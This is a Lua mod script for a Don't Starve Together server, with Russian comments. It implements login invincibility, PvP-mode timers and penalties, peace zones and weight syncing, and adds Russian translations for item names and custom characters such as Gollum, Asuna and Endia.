	--фиксим еду на старте, чтобы она выводила из ступора
	local comp_edible = require "components/edible"
	local old_OnEat = comp_edible.OnEaten
	function comp_edible:OnEaten(eater,...)
		if eater.inv_mode_at_loing then
			eater.inv_mode_at_loing = nil
			eater.components.health:SetInvincible(false)
		end
		return old_OnEat(self,eater,...)
	end

	
	
	local function newKnownTarget()
		return {respect = 0, kills = 0}
	end
	
	AddPlayersPostInit(function(inst)
		--невидимая птичка
		
		---Поддержка дружбы и вражды. Каждый игрок запоминает всех, с кем взаимодействовал.
		
		--print("USER ID = "..tostring(inst.userid))
		
	
		----
		inst:DoTaskInTime(0,function(inst) --пропускаем тик, чтобы сработали OnLoad
			--инициализируем след. тик. Ибо иначе не доступен userid
			w.components.justsave.UpdateUser(inst)
			inst.knownTargets = w.components.justsave.data.player[inst.userid].knownTargets
			if not (inst.knownTargets) then
				inst.knownTargets = {new=newKnownTarget} --ассоц. массив по userid
				w.components.justsave.data.player[inst.userid].knownTargets = inst.knownTargets
			end
			inst.knownTargets.new = newKnownTarget --Функции не сохраняются в OnSave!!
			--если был недавно в пвп режиме, то продлеваем пвп режим на 60 секунд
			if _pvp_players[inst.userid] then
				inst:PushEvent("pvp_mode",{reason="login"})
			end



		if inst.components.health then
			--print("Making Invincible...")
			local j = w.components.justsave
			local pen
			if j then
				pen = j.data.pvp_penalty[inst.userid]
				if pen then
					inst.components.health:SetPenalty(pen.revives * PENALTY_VALUE)
					inst.components.health:ForceUpdateHUD()
					--inst.components.health:RecalculatePenalty() --deprecated
				end
			end
			inst.inv_mode_at_loing = true
			inst.components.health:SetInvincible(true) --делаем бессмертным на входе в игру
			inst.inve_mode_fx = SpawnPrefab("forcefieldfx")
			if inst.inve_mode_fx then
				inst:AddChild(inst.inve_mode_fx)
			end
			--добавить ли спец. эффектов?
			--forcefieldfx - сетевое защитное поле с кучей анимации
			local x,y,z = inst.Transform:GetWorldPosition()
			local cnt = 0
			--print("x,y,z = ",x,",",y,",",z)
			inst.login_inv_task = inst:DoPeriodicTask(0.5,function(inst)
				--print("inv_task")
				if not inst:IsValid() then
					inst.login_inv_task:Cancel()
					return
				end
				cnt = cnt + 1
				local x1,y1,z1 = inst.Transform:GetWorldPosition()
				if math.abs(x1-x) > 0.1 or math.abs(z1-z) > 0.1 or cnt > 30 or not inst.inv_mode_at_loing then
					--print("Stop Invincible")
					inst.inv_mode_at_loing = nil
					inst.components.health:SetInvincible(false)
					inst.login_inv_task:Cancel()
					if inst.inve_mode_fx then
						inst:RemoveChild(inst.inve_mode_fx)
						inst.inve_mode_fx:Remove()
					end
					if j then
						--local pen = j.data.pvp_penalty[inst.userid]
						if pen then --нашли судимость
							--print("pen.revives = "..pen.revives..", pen.tm = "..pen.tm)
							if pen.tm > 0 then --нашли квитанцию за прошлый раз
								----> тут можно вывести анонс, сколько чела не было.
								pen.tm = -9000
								if inst.components.health.penalty >= TUNING.MAXIMUM_HEALTH_PENALTY then --предел штрафа. Убиваем (ли?)
									--(amount, overtime, cause, ignore_invincible, afflicter, ignore_absorb)
									--inst.components.health:DoDelta(-500,false,"pvpsystem",true,nil,true) --just pk coward
									--c_announce((inst.name=="" and "???" or inst.name).." was punished.")
								else
									local max_hp_before = inst.components.health:GetMaxWithPenalty()
									local revives = 1
									pen.revives = pen.revives + revives
									inst.components.health:SetPenalty(pen.revives * PENALTY_VALUE)
									inst.components.health:ForceUpdateHUD()
									local max_hp_after = inst.components.health:GetMaxWithPenalty()
									--c_announce((inst.name=="" and "???" or inst.name).." was punished ("..
									--	(max_hp_after - max_hp_before)
									--	.." max hp)."
									--)
								end
							--else --нет квитанции, но есть судимость
							--	inst.components.health.numrevives = pen.revives
							--	inst.components.health:RecalculatePenalty()
							end
						end
					end
				end
			end)
		end
		
		end)
	end)
	
	--при смерти сбрасываем счетчик и начисляем свой штраф пвп
	AddStategraphPostInit("wilson", function(sg)
		local old_death_fn = sg.events.death.fn
		sg.events.death.fn = function(inst, data)
			--print("ON DEATH "..inst.name)
			if _pvp_players[inst.userid] then --Если активный пвпшер в данный момент
				--print("Was pvp player!")
				UnregisterPvpPlayer(inst)
				inst:PushEvent("pvp_mode",{stop=true})
				--Нам не нужен штраф за смерть. Это глупо и не стимулирует к пвп, а только к трусости.
				--[[local max_hp = inst.components.health:GetMaxWithPenalty()
				if max_hp >=2 then --накидываем еще штраф
					local pvp = w.components.justsave.data.pvp_penalty
					local pen = pvp[inst.userid] --создаем бд
					if not pen then
						pen = {revives=0,tm=-9000}
						pvp[inst.userid] = pen
					end
					--добавляем штраф пвп
					local revives = 0.25
					pen.revives = pen.revives + revives
					
					--inst.components.health.numrevives = inst.components.health.numrevives + revives --deprectaed
					--inst.components.health:RecalculatePenalty() --нет смысла вычислять здоровье после смерти
					c_announce(inst.name.." received death penalty (-"..
						(TUNING.EFFIGY_HEALTH_PENALTY*revives) --устарело
						.." max hp)."
					)
				else
					print("Too low hp to be punished.")
				end--]]
			end
			return old_death_fn(inst, data)
		end
	end)
	
	--global function. Должна быть видни ниже. Выполняется при получении :PushEvent("pvp_mode",{reason="attack/dist"})
	--либо {stop=true}
	local GetTime = _G.GetTime
	function OnPvpMode(inst,data) --вход в режим пвп. (only server function)
		--Нельзя вводить в пвп режим того, кто из него вышел
		if (inst.components.health and inst.components.health.currenthealth <= 0) or (data and data.stop) then
			if inst.pvpmode_task then
				inst.pvpmode_task:Cancel()
				inst.pvpmode_task = nil
			end
			inst.is_pvpmode = false
			inst.net_is_pvpmode:set(false)
			inst.is_pvpmode2 = false
			inst.net_is_pvpmode2:set(false)
			return 
		end
		--Пис зона. Получаем уведомление о пис зоне каждые 0.5 сек.
		--При этом каждый раз откладываем таймер обнуления значения пис зоны на 1.5 сек.
		if data and data.reason == "peace" and inst.lamp_protect >= inst.lamp_inst.lamp_best - 480 then
			if inst.remove_peace_task then
				inst.remove_peace_task:Cancel()
			end
			inst.net_is_pvp_peace:set(true)
			if _pvp_players[inst.userid] then
				_pvp_players[inst.userid].is_peace_zone = true
			end
			inst.remove_peace_task = inst:DoTaskInTime(1.5,function(inst)
				inst.remove_peace_task = nil
				inst.lamp_protect = 0 --обнуляем уровень защиты
				inst.net_is_pvp_peace:set(false)
				if _pvp_players[inst.userid] then
					_pvp_players[inst.userid].is_peace_zone = false
				end
			end)
			return
		end
		--Невидимость
		if data and data.reason ~= "login" and data.reason~="attack" and (inst.endiaamulet_active or inst:HasTag("badring")) then
			return --Не входим в режим пвп в невидимости, и не продлеваем его.
		end
		--p("OnPvpMode")
		--Целевое время, когда нужно остановить пвп режим.
		local delta = (data and data.reason == "dist")
			and 20 --20 сек (на расстоянии 40 от врага)
			or 60 --после атаки ждем минуту, либо после логина тоже ждем. --attack, login
		inst.pvp_target_tm = math.max(inst.pvp_target_tm or 0,GetTime()+delta)
		--Создаем таймер, если еще нету
		if not inst.pvpmode_task then --Если нет режима пвп (да, определяем по наличию таймера)
			inst.is_pvpmode = true
			inst.net_is_pvpmode:set(true) --начинаем пвп режим
			inst.is_pvpmode2 = true
			inst.net_is_pvpmode2:set(true)
			RegisterPvpPlayer(inst)
			inst.pvpmode_task = inst:DoPeriodicTask(1,function(inst)
				if not inst:IsValid() then
					inst.pvpmode_task:Cancel()
					return
				end
				local time_now = GetTime()
				if inst.is_pvpmode2 and (time_now > inst.pvp_target_tm-10) then --переключаем на серую птицу
					inst.is_pvpmode2 = false
					inst.net_is_pvpmode2:set(false)
				end
				if time_now > inst.pvp_target_tm then --кончилось время
					inst.pvpmode_task:Cancel()
					inst.pvpmode_task=nil
					inst.is_pvpmode = false
					inst.net_is_pvpmode:set(false) --print("NET_PVP_OFF for "..inst.name)
					inst.is_pvpmode2 = false
					inst.net_is_pvpmode2:set(false) --на всякий случай добиваем и эту
					UnregisterPvpPlayer(inst)
				end
			end)
		else --возможна красная или серая птица
			if not inst.is_pvpmode2 then
				inst.is_pvpmode2 = true --Если приходит пуш, значит пвп начинается с самого начала. По-любому активируем
				inst.net_is_pvpmode2:set(true)
			end
		end
	end

end

--Рецепт сердца
ChangeRecipe("reviver",{humanmeat=3,berries=1,rope=1},nil,TECH.SCIENCE_ONE,RECIPETABS.ANCIENT,nil,nil,true)
if SERVER_SIDE then
	TUNING.REVIVER_CRAFT_HEALTH_PENALTY = 0 --нет необходимости, т.к. клеи уже убрали урон (хоть и криво)
	local function reviver_eaten(inst, eater)
		local data = w.components.justsave.data.pvp_penalty[eater.userid]
		local delta = 0
		if data and data.revives > 0 then
			local before = eater.components.health:GetMaxWithPenalty()
			print("Eat heart "..(before))
			data.revives = math.max(0,data.revives-1)
			eater.components.health:SetPenalty(data.revives * PENALTY_VALUE)
			eater.components.health:ForceUpdateHUD()
			delta = eater.components.health:GetMaxWithPenalty() - before
			print("Delta = "..delta)
			--_G.c_announce((eater.name=="" and "???" or eater.name).." ate someone's heart"..(delta>0 and (" (+"..delta.." max hp)")or
			--	" ("..(w.state.isday and (w.state.time < 0.5 and "breakfast" or "lunch") or (w.state.isnight and "supper" or "dinner"))..")"
			--)..".")
		else
			--_G.c_announce((eater.name=="" and "???" or eater.name).." ate someone's heart.")
		end
	end
	AddPrefabPostInit("reviver",function(inst)
		if not inst.components.edible then
			inst:AddComponent("edible")
		end
		inst.components.edible:SetOnEatenFn(reviver_eaten)
	end)
end




--local pvp_weapons = {}
local function OnAttackOther(inst, data)
	--p("OnAttackOther")
	local pvp_mode
	--[[if data.weapon and pvp_weapons[data.weapon.prefab] then
		--p("pvp weapon!")
		pvp_mode = true
	else--]]
	if data and data.target and inst~=data.target and inst.userid
		and (data.target:HasTag("player")) --or abigail?
	then
		--OnAttackPlayer(inst,data.target,data.weapon)
		--p("hit player!")
		pvp_mode = true
	end
	print((inst.name=="" and "???" or inst.name).." -------[hit]-----> "
		..tostring(data.target and data.target:HasTag("player") and data.target.name or data.target.prefab)
		..(data.target and data.target.components.health and "("..math.floor(data.target.components.health.currenthealth+0.5).."/"..data.target.components.health.maxhealth..")" or "")
		.." with "..tostring(data.weapon and data.weapon.prefab or "nothing"))
	if pvp_mode then
		inst:PushEvent("pvp_mode",{reason="attack"})
		--if data and data.target and data.target.kills and (data.target.kills >= 2 or data.target.aggro >= 10) then
			data.target:PushEvent("pvp_mode",{reason="attack"})
		--end
		--Отношения рушатся у обоих.
		if inst.knownTargets then
			local kt = inst.knownTargets[data.target.userid]
			if not kt then
				kt = inst.knownTargets.new()
				inst.knownTargets[data.target.userid] = kt
			end
			if kt.respect > 420 then
				kt.respect = kt.respect * 0.5
			else
				kt.respect = kt.respect - 60
			end
		end
		if data.target.knownTargets then
			local kt = data.target.knownTargets[data.target.userid]
			if not kt then
				kt = data.target.knownTargets.new()
				data.target.knownTargets[data.target.userid] = kt
			end
			if kt.respect > 420 then
				kt.respect = kt.respect * 0.5
			else
				kt.respect = kt.respect - 60
			end
		end
	end
end

local function OnGetWeight(inst,data) --only server function
	inst.net_char_weight:set(data.weight * 10)
	inst.net_char_load:set(data.load)
end

local function OnWeightChanged(inst) --only client function
	inst.char_weight = inst.net_char_weight:value() * 0.1
	inst.char_load = inst.net_char_load:value()
	--меняем бейджи (если есть, но должны быть)
	if inst == _G.ThePlayer then
		local badge = inst.HUD.controls.status.char_weight
		if badge then
			badge.num:SetString(inst.char_weight.."/"..inst.char_load.."kg")
		end
	end
end

local function OnSwitchPvpMode(inst) --only client function
    inst.is_pvpmode = inst.net_is_pvpmode:value()
	inst.is_pvpmode2 = inst.net_is_pvpmode2:value()
	inst.is_pvp_peace = inst.net_is_pvp_peace:value()
	--print("Client OnSwitchPvpMode("..tostring(inst.name)..") = "..(inst.is_pvpmode and "on" or "off").."/"..(inst.is_pvpmode2 and "on" or "off"))
	--далее обработка отображения
	if inst.HUD and inst.HUD.pvpmode then
		if inst.is_pvpmode then
			inst.HUD.pvpmode:Show()
		else
			inst.HUD.pvpmode:Hide()
		end
	end
	--значек пвп!
	if inst.pvp_hawk then
		--is_pvpmode с 1 по 60 секунды. is_pvpmode2 с 1 по 50 секунды
		inst.pvp_hawk:UpdateColor()
	end
end

--вызывается, если игрок вышел из игры
--[[local is_c_shutdown
local function OnPlayerLeft_Coward(inst)
	--print("COWARD!!!!!!!")
	if (not is_c_shutdown) and inst.components.health then
		local delta = 0.5
		inst.components.health.numrevives = inst.components.health.numrevives + delta --deprecated
		inst.components.health.numrevives.RecalculatePenalty()
	end
end--]]

--table.insert(GAME_MODES.wilderness.invalid_recipes,"axe")
--RemoveByValue(GAME_MODES.wilderness.invalid_recipes,"axe")

_G.RemoveByValue(_G.GAME_MODES.wilderness.invalid_recipes,"reviver") --{ "lifeinjector", "resurrectionstatue", "reviver" } }
AddPlayersPostInit(function(inst)
	
	--поддержка отображения пвп режима на клиенте
	inst.is_pvpmode = false --Может быть перезаписано в OnLoad. Или не может?
	inst.net_is_pvpmode = _G.net_bool(inst.GUID, "is_pvpmode", "switch_pvpmode" )
	inst.is_pvpmode2 = false
	inst.net_is_pvpmode2 = _G.net_bool(inst.GUID, "is_pvpmode2", "switch_pvpmode" )
	inst.is_pvp_peace = false
	inst.net_is_pvp_peace = _G.net_bool(inst.GUID, "is_pvp_peace", "switch_pvpmode" )
	--Изменение веса и грузоподъемности
	inst.char_weight = 0
	inst.char_load = 0
	inst.net_char_weight = _G.net_shortint(inst.GUID, "char_weight", "change_weight" )
	inst.net_char_load = _G.net_byte(inst.GUID, "char_load", "change_weight" )
	if CLIENT_SIDE then
		inst:ListenForEvent("switch_pvpmode", OnSwitchPvpMode)
		--также на клиенте добавляем значек
		inst.pvp_hawk = _G.SpawnPrefab("hawk")
		if inst.pvp_hawk then
			inst:AddChild(inst.pvp_hawk)
			inst.pvp_hawk:UpdateColor()
		end
		--Обновление веса
		inst:ListenForEvent("change_weight", OnWeightChanged)
	end
	if ONLY_CLIENT_SIDE then
		return
	end

	--серверные пвп дела
	inst:ListenForEvent("onattackother", OnAttackOther)
	inst:ListenForEvent("pvp_mode", OnPvpMode)
	--отключаем урон в пис зоне
	local old_GetAttacked = inst.components.combat.GetAttacked
	inst.components.combat.GetAttacked = function(self,attacker, damage,...)
		if inst.lamp_protect and inst.lamp_protect > 0
			and attacker and attacker.lamp_protect and attacker:HasTag("player")
			and inst.lamp_protect >= attacker.lamp_protect - 480
		then
			damage = 0
		end
		return old_GetAttacked(self,attacker, damage,...)
	end
	--Обработка изменения веса
	inst:ListenForEvent("new_weight", OnGetWeight)


	--Обработка повторных заходов
	--[[local old_onLoad = inst.OnLoad
	inst.OnLoad = function(inst,data)
		p("Char Load")
		inst.is_saved = data.is_saved
		return old_onLoad(inst,data)
	end
	local old_onSave = inst.OnSave
	inst.OnSave = function(inst,data)
		p("Char Save")
		return old_onSave(inst,data)
	end
	--а саму инициализацию планируем на следующий момент
	inst:DoTaskInTime(0,function(inst)
	
	end)--]]
	--print("DAMN HOOK")
	--inst:ListenForEvent("playerexited",OnPlayerLeft_Coward)
end)

--Сам значек пвп
--Добавляем ссылку на сайт.
if true then --Временно отключаем.
AddAssets({
    Asset("IMAGE", "images/pvpmode.tex"),
    Asset("ATLAS", "images/pvpmode.xml"),
})
--local ImageButton = require "widgets/imagebutton"
AddPlayersPostInit(function(inst)
	inst:DoTaskInTime(0,function(inst)
	if inst==_G.ThePlayer then
		inst.HUD.pvpmode = inst.HUD.under_root:AddChild(_G.Image("images/pvpmode.xml", "pvpmode.tex"))
		inst.HUD.pvpmode:SetVRegPoint(_G.ANCHOR_TOP)
		inst.HUD.pvpmode:SetHRegPoint(_G.ANCHOR_LEFT)
		inst.HUD.pvpmode:SetVAnchor(_G.ANCHOR_TOP)
		inst.HUD.pvpmode:SetHAnchor(_G.ANCHOR_LEFT)
		inst.HUD.pvpmode:SetPosition(36, -22, 0)
		--inst.HUD.pvpmode:SetScaleMode(_G.SCALEMODE_FILLSCREEN)
		inst.HUD.pvpmode:SetClickable(false)
		if not inst.is_pvpmode then
			inst.HUD.pvpmode:Hide()
		end
		
		--[[function inst.HUD.pvpmode:OnControl(control, down)
			if control == _G.CONTROL_ACCEPT then
				if down then
					self.down = true
				elseif self.down then
					self.down = false
					_G.VisitURL("http://hardcore-server.tk/")
				end
			end
		end--]]
		--inst.HUD.pvpmode.onclick =
		--	function() _G.VisitURL("http://forums.kleientertainment.com/index.php?/forum/26-dont-starve-mods-and-tools/") end
	end
	end)
end)
end


---Бросаемые предметы ----

do
	local function OnThrown(inst, owner, target)
		if target ~= owner then
			owner.SoundEmitter:PlaySound("dontstarve/wilson/boomerang_throw")
		end
		inst.AnimState:PlayAnimation("gold1", true)
		inst.AnimState:SetOrientation( ANIM_ORIENTATION.OnGround )
	end

	local function OnHit(inst, owner, target)
		if owner == target then
			OnDropped(inst)
		end
		local impactfx = SpawnPrefab("impact")
		if impactfx then
			local follower = impactfx.entity:AddFollower()
			follower:FollowSymbol(target.GUID, target.components.combat.hiteffectsymbol, 0, 0, 0 )
			impactfx:FacePoint(inst.Transform:GetWorldPosition())
		end
		--[[if owner and inst.components.finiteuses and not (inst.components.finiteuses:GetUses() < 1) then
			inst.AnimState:PlayAnimation("gold1", true)
			inst.AnimState:SetOrientation( ANIM_ORIENTATION.Default )
		end--]]
	end

	local function OnMiss(inst, owner, target)
		inst.AnimState:PlayAnimation("gold1",true)
		inst.AnimState:SetOrientation( ANIM_ORIENTATION.Default )
		inst.Physics:Stop()
	end
end


------------------ add mods here ----------------------

GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.HAT_BEE_BW = "Spoiling My Noggen"
STRINGS.CHARACTER_DESCRIPTIONS.xenomorph = "*Gourmet. Eat only eggs and human meat\n*However can eat any meat at 0 hunger.\n*Vulnerable only to cold and fire"

---------------------------------------------------------------------------------------------------
------------------------- переводим на русский ¤зык -----------------------------------------------
---------------------------------------------------------------------------------------------------
local RussificationVersion = GetGlobal("RussificationVersion")
--if RussificationVersion and RussificationVersion<"3.6b" then
--end
local RussianTranslationType = GetGlobal("RussianTranslationType")
local RusTranslationType = GetGlobal("RusTranslationType")
local ch_nm = GetGlobal("RegisterRussianName")
if RussificationVersion then --просто наличие русификатора (а значит и русских шрифтов)
	WELCOME_TITLE = "Важное сообщение"
	--if RussificationVersion<"3.6b" then --версия русификатора безнадежно устарела
	--	WELCOME_MESSAGE = "Срочно обнови русификатор! Иначе возможны криты. Просто зайди в меню MODS."
	--else --просто переводим приветствие
		--WELCOME_MESSAGE = "Имеются скрытые ловушки, злые крампусы, сильный дождь и т.д. Юзайте ALT+CLICK на предметах. Золотой Зонтик защищает новичков от дедовщины!"
	--end

if RussianTranslationType and RusTranslationType
	and type(RusTranslationType)=="table" and RussianTranslationType==RusTranslationType[1]
	and ch_nm
	and CLIENT_SIDE --ясень пень, что клиент сайд. На сервере этого просто нет. Но все же проверить надо.
then --полный перевод
	print('RUSSIAN SUCCESSFUL')
	local mk=ch_nm
	local mk_gen = function (n,v) end --заглушка пока что
	local slang = function() end
	
	--[[local mk_post = function(a,b,c,d,e,f,g,h)
		AddPrefabPostInit("forest",function()
			mk(a,b,c,d,e,f,g,h)
		end)
	end--]]


	--[[
	Это не работает, к сожалению.
	local function Translate(eng,rus,ch)
		--Добавляет перевод, который может быть строкой или таблицей.
		_G.RusSpeechHashTbl[ch or "GENERIC"][eng]=rus
	end
	Translate("I'm too cold!","Мне слишком холодно!")
	Translate("I can't work hard if I'm cold!","Плохо получается, когда холодно!")
	Translate("It's too wet!","Мокро и очень скользко!")
	Translate("So wet!","Так скользко!!")
	Translate("Hard work!","Какая тяжёлая работа!")
	Translate("Very hard work!","Разрушать - тяжкий труд!")
	Translate("I have to eat to perform difficult work.","Кто не работает, тот ест.")
	Translate("I can't work, I didn't eat yet.","Нужно поесть, чтобы взяться за тяжелую работу.")
	Translate("","")
	--]]

	--[
	--Подменяем реплики. Это работает!
	local new_phrases = {
		["I'm too cold!"] = "Мне слишком холодно!",
		["I can't work hard if I'm cold!"] = "Плохо получается, когда холодно!",
		["It's too wet!"] = "Мокро и очень скользко!",
		["So wet!"] = "Так скользко!!",
		["Hard work!"] = "Какая тяжёлая работа!",
		["Very hard work!"] = "Разрушать - тяжкий труд!",
		["I have to eat to perform difficult work."] = "Нужно поесть, чтобы взяться за тяжелую работу.",
		["I can't work, I didn't eat yet."] = "Не могу работать на пустой желудок!",
		
		--Pickle it!
		["If I want that potato, I'll need a shovel"] = "Если я хочу эту картошку, то мне нужна лопата.",
		
		--Gollum
		["My precious!"] = "Моя прелесть!",
		["Puissance in a pocket!"] = "Безграничная власть у меня в кармане!",
		["Burn... the Ring?!"] = "Может, попытаться его сжечь?",
		["More mighty!"] = "Больше могущества!",
		["Abigail always can see me!"] = "Абигейл всё равно увидит меня.",
		["BLACK MAGIC DETECTED!"] = "ОБНАРУЖЕНА ЧЁРНАЯ МАГИЯ!",
		["Ha! Sauron my old good friend!"] = "Ха! Мы с Сауроном - старые добрые друзья!",
		
		--Endia
		["My own amulet, it hides me well."] = "Мой личный амулет, он позволяет хорошо спрятаться.",
		["This amulet makes the wearer invisible, but it will also drive them insane."] = "Делает владельца невидимым, но жутко портит настроение.",
		
		--Asuna
		["It's stronger in elf's hand."] = "Древний меч эльфов.",
		["Asuna's tree branch wand."] = "Деревянный прут Асуны для исцеления.",
		
		["Wish I had some gloves for this thing!"] = "Мне пригодились бы перчатки для этого факела!",
		["I feel so safe wearing it."] = "Какое ПвП зимой без этой понтовой шапки?",
		["How do I procure said coconut?"] = "Что еще можно встретить в пустыне?",
		["Spoiling My Noggen"] = "Теперь у меня кокосовая башка.",
		["I know it's good. How do I get it open"] = "Почему орех кокос волосами весь оброс?",
		["Mmmmmmm.....fuzzy"] = "Ммммммм..... пушистый.",

		["Magic? Seems grifers can't touch me."] = "Магия? Кажется, гриферы меня теперь не трогают.",
		["It calls upon lightning to strike down my foes."] = "Я обрушу молнии на своих врагов!",
		["Effie's blow dart."] = "Многоразовый духовой дротик дикарки.",

	}

	local old_TranslateToRussian = _G.TranslateToRussian
	_G.TranslateToRussian = function(message,entity,...)
		if new_phrases[message] then
			message = new_phrases[message]
		end
		return old_TranslateToRussian(message,entity,...)
	end --]]
	
	--Не честный прием, от которого нужно избавиться как можно скорее.
	local virt_base --виртуальная база для копии-обманки
	local virt_copy = { --создаем виртуальную копию-обманку
		--self.prefab, --лень возиться с __index
		--self.name
		no_wet_prefix = true, --грязный хак на оригинальную функцию
		HasTag = function() return false end,
		GetAdjective = function(self) return virt_base:GetAdjective(self) end,
	}
	
	local old_GetDisplayName = _G.EntityScript.GetDisplayName --функция русификатора (скорее всего)
	_G.EntityScript.GetDisplayName = function(self)
		local name = old_GetDisplayName(self) --Искаженное русификатором название без "+"
		local postfix
		if name and string.sub(name,1,14) == "Lambent Light " and string.sub(name,15,15)~="+" then
			postfix = " +"..string.sub(name,15)
		elseif name and string.sub(name,1,13) == "Сияющий Свет " and string.sub(name,14,14)~="+" then
			postfix = " +"..string.sub(name,14)
		else
			return name
		end
		virt_base = self
		virt_copy.name = "Сияющий Свет"
		virt_copy.prefab = self.prefab
		name = old_GetDisplayName(virt_copy) .. postfix
		return name
	end
	

	local s = _G.STRINGS
	local rec = s.RECIPE_DESC
	local nm = _G.s.NAMES
	local gendesc = s.CHARACTERS.GENERIC.DESCRIBE
    --local 
---- русик здесь ----- 

AddPrefabPostInit("forest",function()
	nm.GOLD = "Золотой слиток"
	rec.GOLD = "Полезная штука. И красивая."
end)


----
nm.MATCHES = "Спички"
AddPrefabPostInit("matches",function(inst)
	--фикс имени на клиенте
	inst.displaynamefn = function()
		if inst.damp then
			return "Отсыревшие спички"
		else
			return "Спички"
		end
	end	
end)

--Перевод не переведенных игрушек
mk("TRINKET_14","Треснувшая чашка",3)
mk("TRINKET_15","Белый слон",1,0,"Белого слона")
mk("TRINKET_16","Чёрный слон",1,0,"Чёрного слона")
mk("TRINKET_17","Изогнутая ложка-вилка",3,"Изогнутой ложке-вилке")
mk("TRINKET_18","Игрушечный троянский конь",1,"Игрушечному троянскому коню","Игрушечного троянского коня")
mk("TRINKET_19","Неустойчивая юла",3)
mk("TRINKET_20","Спиночесалка",3)
mk("TRINKET_21","Б/у миксер",1)
mk("TRINKET_22","Потрепанная пряжа",3)
mk("TRINKET_23","Язычок для обуви",1,0,1)
mk("TRINKET_24","Копилка",3)
mk("TRINKET_25","Антиосвежитель воздуха",1,"Антиосвежителю воздуха",1)
mk("TRINKET_26","Чашка из картофеля",3,"Чашке из картофеля","Чашку из картофеля")
mk("TRINKET_27","Вешалка из проволоки",3)



--Обелиски
mk("SLEEP_ROCK","Обелиск антимагии",1)
rec.SLEEP_ROCK = "Защищает область от проявлений магии."

--Странный медальон
mk("NIGHTMARE_TIMEPIECE","Кровавый медальон",1)
rec.NIGHTMARE_TIMEPIECE = "Поглощает магию. Питается кровью."
--_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.NIGHTMARE_TIMEPIECE = "Выглядит странно..."


--Костры
mk("CAMPFIRE2","Костер из веток",1,"Костру из веток")
rec.CAMPFIRE2 = "Если нет брёвен."

--Клановая система
if wr_kinds then
	wr_kinds.featherhat.acceptbtn.text = "Новый клан"
end
mk("FEATHERHAT","Шляпа вождя",3,1,"Шляпу вождя",true,1)
rec.FEATHERHAT = "Позволяет создать клан."
gendesc.FEATHERHAT = "Я завоюю этот мир..."	

mk("GREENSTAFF","Жезл короткой жизни",1,1,1,nil,"Жезлом короткой жизни")
rec.GREENSTAFF = "Даёт клану отдельный остров."

--Дополнительные предметы
ch_nm("WOODEN_CLUB","Деревянная дубинка",3)
rec.WOODEN_CLUB = "Простая пещерная дубинка из дерева."
gendesc.WOODEN_CLUB = "Древнее дробящее оружие."
		
ch_nm("DROK_CLUB","Зубастая дубинка",3)
rec.DROK_CLUB = "В атаку!!!!"
gendesc.DROK_CLUB = "Древнее дробящее оружие."	
		
ch_nm("SPEAR_THROW","Метательное копьё",4,"Метательному копью",1,nil,"Метательным копьём")
		
STRINGS.NAMES.TOMAHAVK = "Томагавк"
		
ch_nm("SLING","Праща",3)
		
STRINGS.NAMES.SLINGSHOT = "Снаряд"
		
STRINGS.NAMES.ARMOR_BEEFALO = "Свитер"
--GLOBAL.STRINGS.RECIPE_DESC.ARMOR_BEEFALO = "Beefalo suit. Warm and tough."
		
ch_nm("ARMOR_ROCK","Каменная броня",3)
--GLOBAL.STRINGS.RECIPE_DESC.ARMOR_ROCK = "Seems too heavy to wear it."
		

ch_nm("LARGE_BONE","Большая кость")
--STRINGS.CHARACTERS.GENERIC.DESCRIBE.LARGE_BONE = "Large beefalo bone."
	
ch_nm("ARMOR_MEAT","Мясная броня",3)
--GLOBAL.STRINGS.RECIPE_DESC.ARMOR_MEAT = "Hard and fleshy."

nm.FIGHTSTICK="Хлыст"
nm.KNIFE = "Нож"

--Gollum
_G.STRINGS.CHARACTER_TITLES.gollum = "Смеагол"--"No! It's me Smeagol!"
_G.STRINGS.CHARACTER_NAMES.gollum = "gollum"
_G.STRINGS.CHARACTER_DESCRIPTIONS.gollum = "*Имеет своё ненаглядное кольцо.\n*Любит сырое мясо, особенно рыбу.\n*Быстрый, но слабый."
_G.STRINGS.CHARACTER_QUOTES.gollum = "\"Моя прелесть!\""
for i,v in ipairs(_G.CHARACTER_GENDERS.MALE) do
	if v == "gollum" then
		table.remove(_G.CHARACTER_GENDERS.MALE,i)
		table.insert(_G.CHARACTER_GENDERS.PLURAL,"gollum")
		break
	end
end

ch_nm("RING","Кольцо Всевластья",4,0,1,true)
--[[gendesc.RING = {	
	"Моя прелесть!",
	 
}--]]


--Asuna
STRINGS.CHARACTER_TITLES.asuna = "Неистовый Целитель"
STRINGS.CHARACTER_NAMES.asuna = "Asuna"
STRINGS.CHARACTER_DESCRIPTIONS.asuna = "*Исцеляет раненых\n*Очень слабая девушка\n*Хороший наставник (всем хорошо с ней)"
STRINGS.CHARACTER_QUOTES.asuna = "\"Я не хочу проиграть... Что бы ни случилось!\""

ch_nm("LAMBENTLIGHT","Сияющий Свет",1,nil,nil,true)
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.LAMBENTLIGHT = "Древний меч эльфов."
ch_nm("ASUNAWAND","Прут Асуны",1,nil,nil,true)
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.ASUNAWAND = "Деревянный прут Асуны для исцеления."

--Endia
if s.CHARACTERS.ENDIA then
	s.CHARACTER_TITLES.endia = "Параноидальная эльфийка"
	s.CHARACTER_NAMES.endia = "Endia"  -- Note! This line is especially important as some parts of the game require
                                            -- the character to have a valid name.
	s.CHARACTER_DESCRIPTIONS.endia = "*Полная паранойя, двойные штрафы к рассудку.\n*Любит жить с животными.\n*Обладает Амулетом Невидимости."
	s.CHARACTER_QUOTES.endia = "\"Я... я знаю, ты там, п-п-покажись!\""

	-- Announcement when losing sanity for killing creatures
	s.CHARACTERS.ENDIA.ANNOUNCE_KILL_INNOCENT_CREATURE = "Бедное создание!\nЯ кажется схожу с ума..."
	-- Endia's description of her amulet
	s.CHARACTERS.ENDIA.DESCRIBE.ENDIAAMULET = "Мой личный амулет, он позволяет хорошо спрятаться."
	-- Generic description of endia's amulet (anyone that is not endia inspecting it)
	s.CHARACTERS.GENERIC.DESCRIBE.ENDIAAMULET = "Этот амулет прячет в сумраке, но с ним можно свихнуться."
	-- Endia's amulet name
	ch_nm("ENDIAAMULET","Амулет Невидимости",1,0,0,true)
end


--Endo torch
ch_nm("ENDOTHERMIC_TORCH","Эндотермический факел",1,"Эндотермическому факелу",1,nil,"Эндотермическим факелом")
rec.ENDOTHERMIC_TORCH = "Охладился и в путь!"
gendesc.ENDOTHERMIC_TORCH = "Мне пригодились бы перчатки для этого факела!"

--Santa Hat
ch_nm("SANTA_HAT","Шапка Санты",3)
